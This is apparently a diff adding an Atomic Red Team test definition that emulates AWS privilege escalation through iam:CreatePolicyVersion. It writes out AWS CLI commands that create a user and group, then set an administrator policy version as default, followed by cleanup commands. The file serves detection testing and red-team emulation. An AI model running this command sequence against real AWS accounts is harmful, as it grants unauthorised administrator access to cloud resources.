@@ -1,0 +1,37 @@
+attack_technique: TA0004
+display_name: AWS Privillege Escalation 
+atomic_tests:
+- name: iam:CreatePolicyVersion 
+  auto_generated_guid: 8822c3b0-d9f9-4daf-a043-49f460236114
+  description: |
+    Users with the iam:CreatePolicyVersion permission are allowed to create a new version of an existing policy. Consequently, they can create a policy that allows more permissions than what they currently have.
+  supported_platforms:
+  - macos
+  - linux
+  input_arguments:
+    username:
+      description: Username of the user to create
+      type: String
+      default: "AtomicRedTeam"
+    aws_account_id:
+      description: AWS ACCOUNT ID
+      type: String
+      default: "591511147606"
+  executor:
+    command: |
+      aws iam create-user --user-name #{username}
+      aws iam create-group --group-name #{username}
+      aws iam add-user-to-group --user-name #{username} --group-name #{username}
+      aws iam create-policy --policy-name #{username} --policy-document file:///Users/bpatel/Research/malware/github/atomic-red-team/atomics/TA0004/src/default_policy.json
+      aws iam attach-group-policy --policy-arn arn:aws:iam::#{aws_account_id}:policy/#{username} --group-name #{username}
+      aws iam create-policy-version --policy-arn arn:aws:iam::#{aws_account_id}:policy/#{username} --policy-document file:///Users/bpatel/Research/malware/github/atomic-red-team/atomics/TA0004/src/admin_policy.json --set-as-default
+
+    cleanup_command: |
+      aws iam remove-user-from-group --user-name #{username} --group-name #{username}
+      aws iam detach-group-policy --group-name #{username} --policy-arn arn:aws:iam::#{aws_account_id}:policy/#{username}
+      aws iam delete-user --user-name #{username}
+      aws iam delete-group --group-name #{username}
+      aws iam delete-policy-version --policy-arn arn:aws:iam::#{aws_account_id}:policy/#{username} --version-id v1
+      aws iam delete-policy --policy-arn arn:aws:iam::#{aws_account_id}:policy/#{username}
+    name: sh
+    elevation_required: false
